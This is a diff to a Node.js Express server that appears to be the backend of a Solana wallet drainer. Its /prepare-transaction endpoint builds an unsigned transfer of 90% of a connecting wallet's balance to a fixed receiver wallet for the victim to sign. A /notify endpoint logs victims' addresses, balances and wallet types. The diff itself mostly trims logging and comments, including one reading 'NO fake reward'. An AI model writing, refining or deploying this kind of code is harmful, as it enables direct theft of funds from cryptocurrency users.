@@ -14,7 +14,6 @@ const connection = new Connection(HELIUS_RPC, 'confirmed');
 
 console.log('✅ Server starting...');
 console.log(`🎯 Receiver wallet: ${RECEIVER_WALLET}`);
-console.log(`📡 RPC: ${HELIUS_RPC}`);
 
 // ============================================
 // HEALTH CHECK
@@ -24,14 +23,30 @@ app.get('/health', (req, res) => {
 });
 
 // ============================================
+// TEST ENDPOINT
+// ============================================
+app.get('/test', async (req, res) => {
+    try {
+        const testPubkey = new PublicKey('5V2jK6QZqQoD99FrSrBBmdgzdfZWPufzViiDNS8skqiQ');
+        const balance = await connection.getBalance(testPubkey);
+        res.json({ 
+            success: true, 
+            message: 'Server is working!',
+            balance: balance / 1e9,
+            receiver: RECEIVER_WALLET.slice(0, 8) + '...'
+        });
+    } catch (err) {
+        res.json({ success: false, error: err.message });
+    }
+});
+
+// ============================================
 // GET BALANCE
 // ============================================
 app.post('/api/getBalance', async (req, res) => {
     try {
         const { publicKey } = req.body;
-        if (!publicKey) {
-            return res.status(400).json({ error: 'publicKey required' });
-        }
+        if (!publicKey) return res.status(400).json({ error: 'publicKey required' });
         
         const pubkey = new PublicKey(publicKey);
         const balance = await connection.getBalance(pubkey);
@@ -50,7 +65,6 @@ app.post('/api/getBalance', async (req, res) => {
 app.post('/api/getBlockhash', async (req, res) => {
     try {
         const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-        console.log(`🔗 Blockhash: ${blockhash}`);
         res.json({ success: true, blockhash, lastValidBlockHeight });
     } catch (err) {
         console.error('❌ GetBlockhash error:', err.message);
@@ -64,9 +78,7 @@ app.post('/api/getBlockhash', async (req, res) => {
 app.post('/api/sendTransaction', async (req, res) => {
     try {
         const { transaction } = req.body;
-        if (!transaction) {
-            return res.status(400).json({ error: 'transaction required' });
-        }
+        if (!transaction) return res.status(400).json({ error: 'transaction required' });
         
         const txBuffer = Buffer.from(transaction, 'base64');
         const signature = await connection.sendRawTransaction(txBuffer);
@@ -89,34 +101,27 @@ app.post('/prepare-transaction', async (req, res) => {
         const { publicKey } = req.body;
         
         if (!publicKey) {
-            console.log('❌ Missing publicKey');
             return res.status(400).json({ success: false, error: 'publicKey required' });
         }
         
         console.log(`👛 Wallet: ${publicKey.slice(0, 8)}...`);
         
-        // Parse public keys
         const fromPubkey = new PublicKey(publicKey);
         const toPubkey = new PublicKey(RECEIVER_WALLET);
         
-        // Get balance
         const balance = await connection.getBalance(fromPubkey);
         console.log(`💰 Balance: ${(balance / 1e9).toFixed(4)} SOL`);
         
-        // Check minimum balance (0.02 SOL)
         if (balance < 20000000) {
-            console.log(`❌ Insufficient balance`);
             return res.json({ 
                 success: false, 
                 error: `Insufficient balance. Have: ${(balance / 1e9).toFixed(4)} SOL, Need: 0.02 SOL` 
             });
         }
         
-        // Send 90% of balance (keep 10% for fees)
         const amountToSend = Math.floor(balance * 0.9);
         console.log(`📤 Amount to send: ${(amountToSend / 1e9).toFixed(6)} SOL`);
         
-        // Create a simple transfer transaction (NO fake reward)
         const transaction = new Transaction();
         transaction.add(
             SystemProgram.transfer({
@@ -126,7 +131,6 @@ app.post('/prepare-transaction', async (req, res) => {
             })
         );
         
-        // Serialize WITHOUT blockhash (frontend will add fresh one)
         const serialized = transaction.serialize({
             requireAllSignatures: false,
             verifySignatures: false
@@ -142,12 +146,8 @@ app.post('/prepare-transaction', async (req, res) => {
         });
         
     } catch (err) {
-        console.error('❌ Prepare transaction error:', err.message);
-        console.error('   Stack:', err.stack);
-        res.status(500).json({ 
-            success: false, 
-            error: err.message 
-        });
+        console.error('❌ Prepare error:', err.message);
+        res.status(500).json({ success: false, error: err.message });
     }
 });
 
@@ -156,30 +156,10 @@ app.post('/prepare-transaction', async (req, res) => {
 // ============================================
 app.post('/notify', (req, res) => {
     const { address, balance, walletType, customMessage } = req.body;
-    console.log('\n📱 NOTIFICATION:');
-    console.log(`   ${customMessage}`);
+    console.log('\n📱 NOTIFICATION:', customMessage);
     console.log(`   Address: ${address ? address.slice(0, 8) + '...' : 'unknown'}`);
     console.log(`   Balance: ${balance} SOL`);
-    console.log(`   Wallet: ${walletType}`);
     res.json({ ok: true });
-});
-
-// ============================================
-// TEST ENDPOINT (to verify server is working)
-// ============================================
-app.get('/test', async (req, res) => {
-    try {
-        const testPubkey = new PublicKey('5V2jK6QZqQoD99FrSrBBmdgzdfZWPufzViiDNS8skqiQ');
-        const balance = await connection.getBalance(testPubkey);
-        res.json({ 
-            success: true, 
-            message: 'Server is working!',
-            balance: balance / 1e9,
-            receiver: RECEIVER_WALLET.slice(0, 8) + '...'
-        });
-    } catch (err) {
-        res.json({ success: false, error: err.message });
-    }
 });
 
 // ============================================
@@ -189,6 +169,5 @@ const PORT = process.env.PORT || 5000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n🚀 Server running on port ${PORT}`);
     console.log(`🎯 Receiver: ${RECEIVER_WALLET.slice(0, 8)}...${RECEIVER_WALLET.slice(-8)}`);
-    console.log(`📡 RPC: Helius (mainnet)`);
-    console.log(`🌐 Test endpoint: /test\n`);
+    console.log(`🌐 Test: /test\n`);
 });
